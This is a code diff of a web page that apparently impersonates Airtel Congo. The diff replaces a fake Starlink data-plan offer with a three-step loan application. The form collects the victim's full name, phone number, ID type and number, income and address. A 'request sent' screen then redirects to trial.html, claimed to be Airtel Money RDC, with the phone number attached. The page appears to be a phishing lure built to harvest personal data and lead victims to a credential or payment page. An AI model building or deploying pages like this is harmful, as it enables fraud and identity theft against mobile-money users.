@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-<title>Airtel x Starlink — Forfaits Internet</title>
+<title>Airtel — Demande de prêt</title>
 <style>
   :root{
     --red-deep:#7a0f16;
@@ -175,120 +175,279 @@
     margin-right:auto;
   }
 
-  /* Plans grid */
-  .plans{
-    padding:4px 14px 26px;
+  /* Loan application form */
+  .loan-form{
+    margin:0 14px 24px;
+    background:#fff;
+    color:#2a2a2a;
+    border-radius:18px;
+    padding:22px 16px 20px;
+    box-shadow:0 10px 24px rgba(0,0,0,0.25);
+  }
+  .section-title{
+    color:var(--red-deep);
+    font-size:15px;
+    font-weight:800;
+    margin:4px 0 14px;
+    padding-bottom:8px;
+    border-bottom:2px solid #f1e4df;
+  }
+  .section-title:not(:first-child){margin-top:24px;}
+  label{
+    display:block;
+    font-size:12px;
+    font-weight:700;
+    color:#4a272a;
+    margin-bottom:13px;
+  }
+  input, select{
+    width:100%;
+    margin-top:7px;
+    min-height:46px;
+    border:1px solid #ddd;
+    border-radius:10px;
+    padding:11px 12px;
+    font:inherit;
+    font-size:14px;
+    color:#222;
+    background:#fff;
+    outline:none;
+  }
+  input:focus, select:focus{
+    border-color:var(--red-bright);
+    box-shadow:0 0 0 3px rgba(200,30,40,0.10);
+  }
+  .phone-field{
+    display:flex;
+    align-items:center;
+    margin-top:7px;
+    border:1px solid #ddd;
+    border-radius:10px;
+    overflow:hidden;
+    background:#fff;
+  }
+  .phone-field:focus-within{
+    border-color:var(--red-bright);
+    box-shadow:0 0 0 3px rgba(200,30,40,0.10);
+  }
+  .phone-prefix{
+    padding:0 11px;
+    min-height:46px;
+    display:flex;
+    align-items:center;
+    background:#f7f3f0;
+    color:#4a272a;
+    font-size:14px;
+    font-weight:800;
+    border-right:1px solid #ddd;
+  }
+  .phone-field input{
+    border:0;
+    border-radius:0;
+    margin-top:0;
+    box-shadow:none !important;
+  }
+  .row{
     display:grid;
     grid-template-columns:1fr 1fr;
-    gap:12px;
+    gap:10px;
   }
-  .plan{
-    background:var(--card-bg-alt);
-    border-radius:16px;
-    padding:18px 14px 16px;
-    color:#2a2a2a;
-    position:relative;
-    box-shadow:0 10px 22px rgba(0,0,0,0.25);
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    border:2px solid transparent;
-  }
-  .plan.highlight{
-    border-color:var(--gold);
-    background:linear-gradient(180deg,#fffdf6,#fff9ec);
-  }
-  .plan.full{
-    grid-column:1 / -1;
-  }
-  .badge{
-    position:absolute;
-    top:-13px;
-    left:14px;
-    background:var(--orange);
-    color:#fff;
-    font-size:11px;
-    font-weight:700;
-    padding:5px 12px;
-    border-radius:20px;
-    display:flex;
-    align-items:center;
-    gap:4px;
-    box-shadow:0 4px 10px rgba(0,0,0,0.25);
-  }
-  .badge.crown{background:linear-gradient(90deg,#f2b632,#e8942c);}
-  .network{
-    font-size:12px;
-    color:#9b9b9b;
-    font-weight:600;
-    letter-spacing:0.5px;
-    margin-top:4px;
-  }
-  .data-amount{
+  .check{
     display:flex;
     align-items:flex-start;
-    gap:2px;
-    margin:6px 0 2px;
-  }
-  .data-amount .num{
-    font-size:clamp(32px, 10vw, 44px);
-    font-weight:800;
-    color:var(--red-bright);
-    line-height:1;
-    font-style:italic;
-  }
-  .data-amount .unit{
-    font-size:15px;
-    font-weight:700;
-    color:var(--red-bright);
-    margin-top:6px;
-  }
-  .validity{
-    font-size:13px;
-    color:#8a8a8a;
+    gap:9px;
+    font-size:11px;
     font-weight:500;
-    margin-bottom:10px;
+    line-height:1.45;
+    margin:8px 0 16px;
   }
-  .divider{
+  .check input{
+    width:18px;
+    min-width:18px;
+    height:18px;
+    min-height:18px;
+    margin:1px 0 0;
+    accent-color:var(--red-bright);
+  }
+  .submit-btn{
     width:100%;
-    height:1px;
-    background:#efefef;
-    margin-bottom:12px;
-  }
-  .price{
-    font-size:24px;
-    font-weight:800;
-    color:#1a1a1a;
-    margin-bottom:12px;
-  }
-  .price sup{
-    font-size:14px;
-    font-weight:700;
-    margin-right:2px;
-    position:relative;
-    top:-2px;
-  }
-  .choose-btn{
-    width:100%;
-    min-height:44px;
+    min-height:48px;
     background:var(--red-bright);
     color:#fff;
     border:none;
     border-radius:24px;
-    padding:12px 6px;
-    font-size:clamp(11px, 3.2vw, 12.5px);
-    font-weight:700;
-    letter-spacing:0.4px;
+    padding:13px 10px;
+    font-size:13px;
+    font-weight:800;
+    letter-spacing:.4px;
     cursor:pointer;
-    box-shadow:0 6px 14px rgba(200,30,40,0.4);
-    transition:transform .15s ease, box-shadow .15s ease;
-    touch-action:manipulation;
+    box-shadow:0 6px 14px rgba(200,30,40,0.35);
   }
-  .choose-btn:active{transform:translateY(1px) scale(0.98);box-shadow:0 4px 10px rgba(200,30,40,0.4);}
-  @media (hover:hover){
-    .choose-btn:hover{transform:translateY(-2px);box-shadow:0 10px 18px rgba(200,30,40,0.5);}
+  .submit-btn:active{transform:translateY(1px);}
+  .submit-btn:disabled{
+    opacity:.75;
+    cursor:wait;
   }
-  .plan.full .data-amount .num{font-size:48px;}
+  .notice{
+    color:#777;
+    font-size:10.5px;
+    line-height:1.45;
+    text-align:center;
+    margin:12px 6px 0;
+  }
+
+  /* Multi-step application */
+  .steps{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:7px;
+    margin:0 22px 16px;
+  }
+  .step{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:4px;
+    color:rgba(255,255,255,.55);
+    min-width:55px;
+  }
+  .step span{
+    width:30px;height:30px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    border:1px solid rgba(255,255,255,.35);
+    font-size:12px;
+    font-weight:800;
+  }
+  .step small{font-size:9px;font-weight:700;}
+  .step.active{color:#fff;}
+  .step.active span{
+    background:var(--gold);
+    color:#3a1013;
+    border-color:var(--gold);
+  }
+  .line{
+    height:1px;
+    flex:1;
+    max-width:48px;
+    background:rgba(255,255,255,.25);
+    margin-bottom:16px;
+  }
+
+  .loan-form{
+    margin:0 14px 24px;
+    background:#fff;
+    color:#2a2a2a;
+    border-radius:18px;
+    padding:22px 16px 20px;
+    box-shadow:0 10px 24px rgba(0,0,0,0.25);
+  }
+  .form-page{display:none;}
+  .form-page.active{display:block;}
+  .section-title{
+    color:var(--red-deep);
+    font-size:16px;
+    font-weight:800;
+    margin:2px 0 18px;
+    padding-bottom:10px;
+    border-bottom:2px solid #f1e4df;
+  }
+  label{
+    display:block;
+    font-size:12px;
+    font-weight:700;
+    color:#4a272a;
+    margin-bottom:15px;
+  }
+  input, select{
+    width:100%;
+    margin-top:7px;
+    min-height:46px;
+    border:1px solid #ddd;
+    border-radius:10px;
+    padding:11px 12px;
+    font:inherit;
+    font-size:14px;
+    color:#222;
+    background:#fff;
+    outline:none;
+  }
+  input:focus, select:focus{
+    border-color:var(--red-bright);
+    box-shadow:0 0 0 3px rgba(200,30,40,0.10);
+  }
+  .actions{
+    display:flex;
+    gap:10px;
+    margin-top:20px;
+  }
+  .actions button{
+    min-height:46px;
+    border-radius:24px;
+    padding:12px 15px;
+    font-size:12px;
+    font-weight:800;
+    letter-spacing:.35px;
+    cursor:pointer;
+  }
+  .next-btn,.submit-btn{
+    flex:1;
+    background:var(--red-bright);
+    color:#fff;
+    border:0;
+    box-shadow:0 6px 14px rgba(200,30,40,.35);
+  }
+  .back-btn{
+    flex:0 0 82px;
+    background:#fff;
+    color:var(--red-deep);
+    border:1px solid #ddd;
+  }
+  .summary{
+    background:#fff8f1;
+    border:1px solid #f0ded3;
+    border-radius:12px;
+    padding:12px;
+    margin-bottom:16px;
+  }
+  .summary div{
+    display:flex;
+    justify-content:space-between;
+    gap:12px;
+    padding:7px 0;
+    border-bottom:1px solid #f0e5df;
+    font-size:11px;
+  }
+  .summary div:last-child{border-bottom:0;}
+  .summary span{color:#888;}
+  .summary strong{color:#321619;text-align:right;}
+  .check{
+    display:flex;
+    align-items:flex-start;
+    gap:9px;
+    font-size:11px;
+    font-weight:500;
+    line-height:1.45;
+    margin:8px 0 0;
+  }
+  .check input{
+    width:18px;
+    min-width:18px;
+    height:18px;
+    min-height:18px;
+    margin:1px 0 0;
+    accent-color:var(--red-bright);
+  }
+  .notice{
+    color:#777;
+    font-size:10.5px;
+    line-height:1.45;
+    text-align:center;
+    margin:12px 6px 0;
+  }
 
   /* Footer strip */
   .footer-strip{
@@ -326,6 +485,126 @@
     .plans{gap:10px;padding-left:10px;padding-right:10px;}
     .plan{padding:16px 10px 14px;}
   }
+
+  /* Redirect screen */
+  .redirect-screen{
+    position:fixed;
+    inset:0;
+    z-index:9999;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:24px;
+    background:linear-gradient(160deg,rgba(122,15,22,.98),rgba(58,8,12,.99));
+  }
+  .redirect-screen.show{display:flex;}
+  .redirect-card{
+    width:min(390px,100%);
+    background:#fff;
+    color:#351619;
+    border-radius:24px;
+    padding:30px 22px 26px;
+    text-align:center;
+    box-shadow:0 20px 50px rgba(0,0,0,.35);
+    animation:cardIn .35s ease-out;
+  }
+  .redirect-logo{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+    margin-bottom:24px;
+  }
+  .redirect-mark{
+    width:32px;height:32px;
+    border-radius:50% 50% 50% 0;
+    background:var(--red-bright);
+    transform:rotate(-45deg);
+    position:relative;
+  }
+  .redirect-mark::after{
+    content:"";
+    position:absolute;
+    inset:8px;
+    border-radius:50%;
+    background:#fff;
+  }
+  .redirect-brand{
+    text-align:left;
+    color:var(--red-bright);
+    font-size:22px;
+    line-height:1;
+    font-weight:900;
+  }
+  .redirect-money{
+    text-align:left;
+    color:#777;
+    font-size:9px;
+    letter-spacing:1.2px;
+    font-weight:800;
+    margin-top:3px;
+  }
+  .redirect-icon{
+    width:54px;height:54px;
+    margin:0 auto 16px;
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#f8eee8;
+    color:var(--red-bright);
+    font-size:25px;
+    font-weight:900;
+  }
+  .redirect-card h2{
+    font-size:23px;
+    margin-bottom:8px;
+  }
+  .redirect-card p{
+    color:#777;
+    font-size:13px;
+    line-height:1.5;
+    margin:0 auto 20px;
+    max-width:300px;
+  }
+  .countdown{
+    width:72px;height:72px;
+    margin:0 auto 10px;
+    border:5px solid #eee0da;
+    border-top-color:var(--red-bright);
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:28px;
+    font-weight:900;
+    color:var(--red-bright);
+    animation:spin 1s linear infinite;
+  }
+  .redirect-label{
+    font-size:11px;
+    color:#888;
+    font-weight:700;
+    margin-bottom:14px;
+  }
+  .progress{
+    height:5px;
+    border-radius:5px;
+    background:#eee;
+    overflow:hidden;
+  }
+  .progress-bar{
+    width:0%;
+    height:100%;
+    background:var(--red-bright);
+    transition:width 1s linear;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes cardIn{
+    from{opacity:0;transform:translateY(12px) scale(.98)}
+    to{opacity:1;transform:translateY(0) scale(1)}
+  }
+
 </style>
 </head>
 <body>
@@ -340,103 +619,271 @@
       </div>
     </div>
     <div class="collab">
-      <div class="eyebrow">En collaboration avec</div>
+      <div class="eyebrow">Services financiers</div>
       <div class="starlink-row">
-        <span class="big">STARLINK</span>
-        <span class="sat">🛰️</span>
-        <span class="brand-name">Starlink</span>
+        <span class="big">LOAN</span>
+        <span class="sat">💳</span>
+        <span class="brand-name">Application</span>
       </div>
     </div>
     <div class="menu-btn"><span></span></div>
   </header>
 
   <section class="hero">
-    <span class="pill"><span class="bars">📶</span> Forfaits Internet</span>
-    <h1>Restez<br>Connecté<br><span class="accent">Sans Limites</span></h1>
-    <p class="sub">Choisissez un forfait. Vous serez redirigé vers la page de connexion Airtel Lite pour procéder au paiement.</p>
+    <span class="pill"><span class="bars">💰</span> Demande de prêt</span>
+    <h1>Votre projet.<br><span class="accent">Votre prêt.</span></h1>
+    <p class="sub">Remplissez le formulaire ci-dessous pour soumettre votre demande de prêt. Vos informations seront utilisées pour l'étude de votre demande.</p>
   </section>
 
-  <section class="plans">
+  <div class="steps">
+    <div class="step active"><span>1</span><small>Profil</small></div>
+    <div class="line"></div>
+    <div class="step"><span>2</span><small>Prêt</small></div>
+    <div class="line"></div>
+    <div class="step"><span>3</span><small>Confirmation</small></div>
+  </div>
 
-    <div class="plan highlight">
-      <div class="network">4G</div>
-      <div class="data-amount"><span class="num">1</span><span class="unit">GB</span></div>
-      <div class="validity">Valide 1 Jour</div>
-      <div class="divider"></div>
-      <div class="price">2273 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=1gb&price=2273'">CHOISIR CE FORFAIT</button>
+  <form class="loan-form" id="loanForm">
+    <div class="form-page active" data-page="1">
+      <div class="section-title">Informations personnelles</div>
+
+      <label>Nom complet
+        <input type="text" name="fullName" placeholder="Votre nom complet" required>
+      </label>
+
+      <label>Numéro de téléphone
+        <div class="phone-field"><span class="phone-prefix">+243</span><input type="tel" name="phone" id="phone" placeholder="9XXXXXXXX" inputmode="numeric" maxlength="9" pattern="9[0-9]{8}" autocomplete="tel-national" required></div>
+      </label>
+
+      <label>Type de pièce d'identité
+        <select name="idType" required>
+          <option value="">Sélectionner</option>
+          <option>Carte d'identité</option>
+          <option>Passeport</option>
+          <option>Permis de conduire</option>
+        </select>
+      </label>
+
+      <label>Numéro de la pièce d'identité
+        <input type="text" name="idNumber" placeholder="Numéro de votre pièce" required>
+      </label>
+
+      <div class="actions">
+        <button type="button" class="next-btn">CONTINUER</button>
+      </div>
     </div>
 
-    <div class="plan">
-      <div class="network">4G</div>
-      <div class="data-amount"><span class="num">3</span><span class="unit">GB</span></div>
-      <div class="validity">Valide 3 Jours</div>
-      <div class="divider"></div>
-      <div class="price">4666 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=3gb&price=4666'">CHOISIR CE FORFAIT</button>
+    <div class="form-page" data-page="2">
+      <div class="section-title">Détails de votre prêt</div>
+
+      <label>Montant demandé (CDF)
+        <input type="number" name="amount" min="1000" step="1000" placeholder="Ex. 500000" required>
+      </label>
+
+      <label>Durée du prêt
+        <select name="term" required>
+          <option value="">Sélectionner</option>
+          <option>1 mois</option>
+          <option>3 mois</option>
+          <option>6 mois</option>
+          <option>12 mois</option>
+          <option>24 mois</option>
+        </select>
+      </label>
+
+      <label>Objet du prêt
+        <select name="purpose" required>
+          <option value="">Pourquoi avez-vous besoin de ce prêt ?</option>
+          <option>Dépenses personnelles</option>
+          <option>Éducation</option>
+          <option>Santé</option>
+          <option>Commerce / activité professionnelle</option>
+          <option>Logement</option>
+          <option>Achat d'équipement</option>
+          <option>Autre</option>
+        </select>
+      </label>
+
+      <label>Situation professionnelle
+        <select name="employment" required>
+          <option value="">Sélectionner</option>
+          <option>Salarié</option>
+          <option>Indépendant</option>
+          <option>Entrepreneur</option>
+          <option>Sans emploi</option>
+          <option>Autre</option>
+        </select>
+      </label>
+
+      <label>Revenu mensuel (CDF)
+        <input type="number" name="income" min="0" step="1000" placeholder="Ex. 800000" required>
+      </label>
+
+      <div class="actions split">
+        <button type="button" class="back-btn">RETOUR</button>
+        <button type="button" class="next-btn">CONTINUER</button>
+      </div>
     </div>
 
-    <div class="plan">
-      <div class="network">4G</div>
-      <div class="data-amount"><span class="num">7</span><span class="unit">GB</span></div>
-      <div class="validity">Valide 7 Jours</div>
-      <div class="divider"></div>
-      <div class="price">9452 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=7gb&price=9452'">CHOISIR CE FORFAIT</button>
-    </div>
+    <div class="form-page" data-page="3">
+      <div class="section-title">Vérification & confirmation</div>
 
-    <div class="plan">
-      <div class="badge">⚡ Populaire</div>
-      <div class="network">4G</div>
-      <div class="data-amount"><span class="num">15</span><span class="unit">GB</span></div>
-      <div class="validity">Valide 7 Jours</div>
-      <div class="divider"></div>
-      <div class="price">17829 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=15gb&price=17829'">CHOISIR CE FORFAIT</button>
-    </div>
+      <div class="summary">
+        <div><span>Nom</span><strong id="summaryName">—</strong></div>
+        <div><span>Téléphone</span><strong id="summaryPhone">—</strong></div>
+        <div><span>Montant</span><strong id="summaryAmount">—</strong></div>
+        <div><span>Durée</span><strong id="summaryTerm">—</strong></div>
+        <div><span>Objet</span><strong id="summaryPurpose">—</strong></div>
+      </div>
 
-    <div class="plan">
-      <div class="badge">💎 Pro</div>
-      <div class="network">4G+</div>
-      <div class="data-amount"><span class="num">30</span><span class="unit">GB</span></div>
-      <div class="validity">Valide 21 Jours</div>
-      <div class="divider"></div>
-      <div class="price">35779 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=30gb&price=35779'">CHOISIR CE FORFAIT</button>
-    </div>
+      <label>Adresse / Ville
+        <input type="text" name="address" placeholder="Votre ville et adresse" required>
+      </label>
 
-    <div class="plan">
-      <div class="badge">🚀 Max</div>
-      <div class="network">4G+</div>
-      <div class="data-amount"><span class="num">50</span><span class="unit">GB</span></div>
-      <div class="validity">Valide 30 Jours</div>
-      <div class="divider"></div>
-      <div class="price">65693 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=50gb&price=65693'">CHOISIR CE FORFAIT</button>
-    </div>
+      <label class="check">
+        <input type="checkbox" name="consent" required>
+        <span>Je confirme que les informations fournies sont exactes et j'autorise leur utilisation pour l'étude de ma demande.</span>
+      </label>
 
-    <div class="plan full highlight">
-      <div class="badge crown">👑 Illimité</div>
-      <div class="network">4G+</div>
-      <div class="data-amount"><span class="num">∞</span></div>
-      <div class="validity">Valide 30 Jours</div>
-      <div class="divider"></div>
-      <div class="price">89617 <sup>CDF</sup></div>
-      <button class="choose-btn" onclick="location.href='trial.html?plan=illimite&price=89617'">CHOISIR CE FORFAIT</button>
-    </div>
+      <div class="actions split">
+        <button type="button" class="back-btn">RETOUR</button>
+        <button type="submit" class="submit-btn">SOUMETTRE LA DEMANDE</button>
+      </div>
 
-  </section>
+      <p class="notice">La soumission d'une demande ne garantit pas l'approbation du prêt. Les conditions, l'éligibilité et le montant accordé sont soumis à l'étude de la demande.</p>
+    </div>
+  </form>
 
   <div class="footer-strip">
-    <div class="item">⚡ Activation instantanée</div>
+    <div class="item">🔒 Informations protégées</div>
     <span class="sep">|</span>
-    <div class="item">🔒 Paiement sécurisé</div>
+    <div class="item">📋 Étude de la demande</div>
     <span class="sep">|</span>
-    <div class="item">📞 Support 24/7</div>
+    <div class="item">📞 Support</div>
   </div>
 
   <p class="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
-
 </div>
+
+<script>
+  const form = document.getElementById('loanForm');
+  const pages = [...document.querySelectorAll('.form-page')];
+  const steps = [...document.querySelectorAll('.step')];
+  let current = 0;
+
+  const phoneInput = document.getElementById('phone');
+
+  phoneInput.addEventListener('input', function(){
+    this.value = this.value.replace(/\\D/g, '');
+    if (this.value.length > 0 && this.value.charAt(0) !== '9') {
+      this.value = '9' + this.value.replace(/^9*/, '');
+    }
+    this.value = this.value.slice(0, 9);
+  });
+
+  phoneInput.addEventListener('blur', function(){
+    this.setCustomValidity(
+      /^9[0-9]{8}$/.test(this.value) ? '' : 'Le numéro doit commencer par 9 et contenir 9 chiffres.'
+    );
+  });
+
+  function validatePage(index){
+    const fields = [...pages[index].querySelectorAll('input, select')];
+    for (const field of fields) {
+      if (!field.checkValidity()) {
+        field.reportValidity();
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function updatePage(){
+    pages.forEach((p,i)=>p.classList.toggle('active',i===current));
+    steps.forEach((s,i)=>s.classList.toggle('active',i<=current));
+    window.scrollTo({top:0, behavior:'smooth'});
+  }
+
+  document.querySelectorAll('.next-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      if (!validatePage(current)) return;
+      if (current < pages.length - 1) {
+        if (current === 1) {
+          document.getElementById('summaryName').textContent = form.fullName.value;
+          document.getElementById('summaryPhone').textContent = '+243' + form.phone.value;
+          document.getElementById('summaryAmount').textContent =
+            Number(form.amount.value || 0).toLocaleString('fr-FR') + ' CDF';
+          document.getElementById('summaryTerm').textContent = form.term.value;
+          document.getElementById('summaryPurpose').textContent = form.purpose.value;
+        }
+        current++;
+        updatePage();
+      }
+    });
+  });
+
+  document.querySelectorAll('.back-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      if (current > 0) { current--; updatePage(); }
+    });
+  });
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    if (!validatePage(current)) return;
+
+    const submitBtn = form.querySelector('.submit-btn');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'DEMANDE ENREGISTRÉE';
+
+    const screen = document.getElementById('redirectScreen');
+    const countdown = document.getElementById('countdown');
+    const progressBar = document.getElementById('progressBar');
+
+    screen.classList.add('show');
+    screen.setAttribute('aria-hidden', 'false');
+
+    let seconds = 4;
+    countdown.textContent = seconds;
+    progressBar.style.width = '0%';
+
+    const timer = setInterval(() => {
+      seconds--;
+      countdown.textContent = seconds;
+      progressBar.style.width = ((4 - seconds) / 4 * 100) + '%';
+
+      if (seconds <= 0) {
+        clearInterval(timer);
+        const phone = form.phone.value;
+        window.location.href = 'trial.html?phone=' + encodeURIComponent('+243' + phone);
+      }
+    }, 1000);
+  });
+</script>
+
+
+  <div class="redirect-screen" id="redirectScreen" aria-hidden="true">
+    <div class="redirect-card">
+      <div class="redirect-logo">
+        <div class="redirect-mark"></div>
+        <div>
+          <div class="redirect-brand">airtel</div>
+          <div class="redirect-money">MONEY RDC</div>
+        </div>
+      </div>
+
+      <div class="redirect-icon">✓</div>
+      <h2>Demande envoyée</h2>
+      <p>Vous allez être redirigé vers <strong>Airtel Money RDC</strong> pour continuer.</p>
+
+      <div class="countdown" id="countdown">4</div>
+      <div class="redirect-label">Redirection en cours...</div>
+
+      <div class="progress">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+    </div>
+  </div>
+
 </body>
 </html>
